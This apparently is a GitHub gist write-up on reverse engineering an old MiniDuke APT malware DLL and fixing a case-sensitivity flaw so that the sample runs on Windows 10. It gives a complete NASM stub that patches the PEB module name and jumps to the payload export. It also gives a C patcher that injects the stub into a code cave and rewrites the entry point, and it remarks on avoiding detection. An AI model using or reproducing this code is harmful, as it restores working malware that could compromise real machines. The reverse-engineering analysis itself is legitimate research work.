@@ -1,0 +1,241 @@
+Fixing an APT sample so it can work on Modern Windows versions - An Exercise in Reverse Engineering.md · GitHub
+Skip to content
+Search Gists
+Search Gists
+All gists
+Back to GitHub
+Sign in
+Sign up
+Sign in
+Sign up
+You signed in with another tab or window. Reload to refresh your session.
+You signed out in another tab or window. Reload to refresh your session.
+You switched accounts on another tab or window. Reload to refresh your session.
+Dismiss alert
+Instantly share code, notes, and snippets.
+ahm3dgg/Fixing an APT sample so it can work on Modern Windows versions - An Exercise in Reverse Engineering.md
+Last active
+September 25, 2025 00:16
+Show Gist options
+Download ZIP
+Star
+7
+(7)
+You must be signed in to star a gist
+Fork
+0
+(0)
+You must be signed in to fork a gist
+Embed
+Embed
+Embed this gist in your website.
+Share
+Copy sharable link for this gist.
+Clone via HTTPS
+Clone using the web URL.
+Learn more about clone URLs
+Clone this repository at &lt;script src=&quot;https://gist.github.com/ahm3dgg/b2041f543be60a8ab956d9bbc0e179a8.js&quot;&gt;&lt;/script&gt;
+Save ahm3dgg/b2041f543be60a8ab956d9bbc0e179a8 to your computer and use it in GitHub Desktop.
+Code
+Revisions
+8
+Stars
+7
+Embed
+Embed
+Embed this gist in your website.
+Share
+Copy sharable link for this gist.
+Clone via HTTPS
+Clone using the web URL.
+Learn more about clone URLs
+Clone this repository at &lt;script src=&quot;https://gist.github.com/ahm3dgg/b2041f543be60a8ab956d9bbc0e179a8.js&quot;&gt;&lt;/script&gt;
+Save ahm3dgg/b2041f543be60a8ab956d9bbc0e179a8 to your computer and use it in GitHub Desktop.
+Download ZIP
+Raw
+Fixing an APT sample so it can work on Modern Windows versions - An Exercise in Reverse Engineering.md
+Fixing an APT sample so it can work on Modern Windows versions - An Exercise in Reverse Engineering
+Sample
+I stumbled upon an old miniduke APT malware, and found that it has some cool tricks, while I won't be explaining how the malware works or what it even does, I will be focusing on showing a code flaw in the sample, that was the reason for a crash that I found while debugging it on Windows 10, as well as showing how we can fix it, that requires some amount of reverse engineering and coding (I will use C & Assembly).
+But to give you a quick introduction, that sample comes as 32-bit DLL file, with one export with name 'JorPglt', which is the start of payload, the sample also employs few simple (code mutation / instruction-level obfuscations) that we will discuss as well.
+So without getting into much details here is where the code flaw resides
+Before pointing where the issue resides, lets see what its doing, we can see that its getting the PEB and walking the LDR, it also employs simple obfuscation techniques for example instead of doing a regular mov instruction it replaces that with a pair of (zeroing, setting) instructions for example here we can see
+mov
+eax, 0
+add
+eax, large fs:30h
+and
+ecx, 0
+add
+ecx, [edi+8]
+we can also see that it replaced the regular sub instruction with clc then sbb, clc clears the carry flag, so here sbb will just behave like sub.
+and also the way it does the looping is a bit clever, or rather stupid, we can see it does
+jmp dword ptr [esp]
+if you payed attention, you can see that there is a call $+5, which will push the return address which is the address of the instruction just after the call, and this is the part responsible for finding kernel32 base address (could also be kernelbase.dll).
+now let's focus on the code flaw, you may ask me how did I knew from this snippet alone that its trying to find kernel32.dll, well I started by guessing at first we can see here it tries to compare the DLL name but starting from 8th byte, since this is Unicode it means after the 4th character, so if its kernel32.dll, that will be 'el32.dll' (pointer arithmetic wise), it then tries to compare 4 bytes starting from dllname + 8, against a hardcoded constant 0x6C0065, this is just 00 65 00 6C if we converted it big endian order, this in Unicode is just el, , we can also see that it replaced cmp with clc; sbb, then doing a jz, if we jumped it means we found the relevant DLL, however guessing is not reliable and for that I had to scroll to see what its trying to do later with the found DLL base, I saw that it tries to find VirtualProtect by parsing the DLL export table.
+the problem here is that its expecting the DLL name to be in lower case, that's the case with Windows XP, however on Windows 10 for instance, the DLL name in case of kernel32 is uppercased like this KERNEL32.DLL, what they should have done is do a case-insensitive comparison, by either first converting to lowercase or uppercase, in this case they should have did a lowercase pass first.
+If you reversed the sample you will see that this check is also used another time, in the encrypted shellcode inside the .data section.
+To Fix this there are multiple ways, one way that is not one of them is to just to patch this constant so that its uppercase, its obvious that this will break the malware if its running on Windows XP for example, another way can patch the instruction so that we can do lowercasing first for example then compare, that will involve creating a new PE section or finding a code cave, that we will then jump to do case-insensitive search and jump back, however this is not very straightforward and requires disassembling the binary and an assembler library, and probably also isn't suitable since this comparison also exists in the encrypted shellcode which gets decrypted at runtime.
+What I decided to do is to just patch the PEB structure, meaning we can just patch the DLL name in the PEB structure it self, that won't be a problem and will fix this sample, since any comparision from windows-related functions like GetModuleHandle and LoadLibrary for instance will be case-insenstive.
+for that I wrote a stub that just does that in assembly, that will then be placed at a code cave inside the DLL, we could have created a new PE section but non-standard pe sections raises detections, apart from that we need to patch the entry point of the DLL to point to our shellcode.
+Here the code
+; assemble: nasm -fbin shellcode.asm
+bits 32
+sub esp, 28
+mov dword [esp + 0],  0x65006B      ; 'ke'
+mov dword [esp + 4],  0x6E0072      ; 'rn'
+mov dword [esp + 8],  0x6C0065      ; 'el'
+mov dword [esp + 12], 0x320033      ; '32'
+mov dword [esp + 16], 0x64002E      ; '.d'
+mov dword [esp + 20], 0x6C006C      ; 'll'
+mov dword [esp + 24], 0x000000
+mov eax, fs:[0x30]                  ; PEB
+mov eax, [eax+0xC]                  ; PEB.Ldr
+mov eax, [eax+0xC]                  ; PEB.Ldr.InLoadOrderModuleList
+mov eax, [eax]                      ; Skip the Main Exec
+mov eax, [eax]                      ; Skip ntdll, kernel32 comes next
+movzx ecx, word [eax+0x2C]          ; (kernel32) BaseDllname.Length
+mov eax, [eax+0x30]                 ; (kernel32) BaseDllname.Buffer
+mov esi, esp
+mov edi, eax
+rep movsb                           ; copy lowercased 'kernel32' to (kernel32) BaseDllname.Buffer
+;; Getting the DLL Base
+;; by walking backwards page by page, and for that to work
+;; we need to first align the address by the PAGE SIZE.
+;; We then try to search for 'MZ'
+call $+5
+pop eax
+add eax, 0x00000fff
+and eax, 0xfffff000
+search_base:
+cmp     word [eax], 0x5A4D
+jz      found
+sub     eax, 0x1000
+jmp     search_base
+found:
+; ref (offsets): https://www.sunshine2k.de/reversing/tuts/tut_pe.htm
+; PE
+mov ebx, [eax + 0x3C]
+add ebx, eax
+; Export Directory
+mov ebx, [ebx + 0x78]
+add ebx, eax
+; Address of Functions
+mov ebx, [ebx + 0x1C]
+add ebx, eax
+; There is only one function so let's get that
+mov ebx, [ebx]
+add ebx, eax
+; Jump to original entry point
+jmp ebx
+I then wrote a simple pe patcher in C that will find the code cave inside the .text section and place the shellcode at it, we finish by saving the modifed DLL to 'miniduke_patched.dll', the code is pretty straightforward and here is it:
+// Compile as x86 Binary
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+#define rva2raw(a, o) ((a) - (o))
+#define raw2rva(a, o) ((a) + (o))
+size_t pe_get_virtual_to_file_offset(PIMAGE_SECTION_HEADER section_header)
+{
+return section_header->VirtualAddress - section_header->PointerToRawData;
+}
+size_t pe_find_codecave(size_t image_base, char* section_name, size_t size, PIMAGE_SECTION_HEADER *found_section)
+{
+PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image_base;
+PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(image_base + dos->e_lfanew);
+PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+for(size_t i = 0; i < nt->FileHeader.NumberOfSections; i++)
+{
+if(!strncmp(section->Name, section_name, strlen(section_name)))
+{
+size_t offset = pe_get_virtual_to_file_offset(section);
+char* data = (char*)image_base + rva2raw(section->VirtualAddress, offset);
+size_t data_size = section->SizeOfRawData;
+size_t x = 0;
+while(x < data_size)
+{
+if(data[x] == 0x00)
+{
+size_t cave_size = 0;
+for(size_t j = x; data[j] == 0 && j < data_size; j++)
+{
+cave_size++;
+}
+if(cave_size >= size)
+{
+*found_section = section;
+return section->PointerToRawData + x;
+}
+}
+x++;
+}
+}
+section++;
+}
+return 0;
+}
+int wmain(int arg_count, wchar_t *args[])
+{
+HANDLE hshellcode;
+DWORD shellcode_size;
+DWORD bytes_rw;
+HANDLE hdll;
+DWORD dll_size;
+HANDLE fixed_file;
+if(arg_count != 3)
+{
+wprintf(L"Usage: fixduke.exe <shellcode_path> <dll_path>\n");
+return 1;
+}
+wchar_t *shellcode_path = args[1];
+wchar_t *dll_path = args[2];
+hshellcode = CreateFileW(shellcode_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+shellcode_size = GetFileSize(hshellcode, NULL);
+void* shellcode = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+ReadFile(hshellcode, shellcode, shellcode_size, &bytes_rw, NULL);
+hdll = CreateFileW(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+dll_size = GetFileSize(hdll, NULL);
+void* dll = VirtualAlloc(NULL, dll_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+ReadFile(hdll, dll, dll_size, &bytes_rw, NULL);
+PIMAGE_SECTION_HEADER section;
+size_t cave = pe_find_codecave((size_t)dll, ".text", shellcode_size, &section);
+printf("found code cave -> %X\n", cave);
+PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll;
+PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((size_t)dos + dos->e_lfanew);
+nt->OptionalHeader.AddressOfEntryPoint = raw2rva(cave, pe_get_virtual_to_file_offset(section));
+memcpy((char*)dll + cave, shellcode, shellcode_size);
+fixed_file = CreateFileW(L"miniduke_fixed.dll", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+WriteFile(fixed_file, dll, dll_size, &bytes_rw, NULL);
+}
+running this will generate the modified DLL, however when trying to run the DLL you will notice an Access Violation Exception, if you tried inspecting that with the Debugger, you will find that its happening at the code trying to get the module base,
+the Debugger shows that we are crashing at the comparison and that eax is 0x403000, the only reason we could crash here is because we don't have read access, and that was the indeed the case, if we tried following 0x403000 in the memory map view we can see that its in the .reloc section.
+we can see that it doesn't have read access rights, you can also verify that by using a PE viewer like CFF explorer you will find out that its not readable
+so the fix here is pretty simple we can just modify our code so it patches the .reloc section header
+Characteristics field and make it readable, or we can just do it manually through any PE editor like CFF Explorer.
+That's it, hopefully you learnt a thing or two, or just found it a good/fun exercise in general, in any case take care and have fun reversing.
+~ ahm3dgg
+Copy link
+x-stp
+commented
+Sep 7, 2025
+nice work
+Sorry, something went wrong.
+Uh oh!
+There was an error while loading. Please reload this page.
+Sign up for free
+to join this conversation on GitHub.
+Already have an account?
+Sign in to comment
+Footer
+© 2025 GitHub, Inc.
+Footer navigation
+Terms
+Privacy
+Security
+Status
+Community
+Docs
+Contact
+Manage cookies
+Do not share my personal information
+You can’t perform that action at this time.
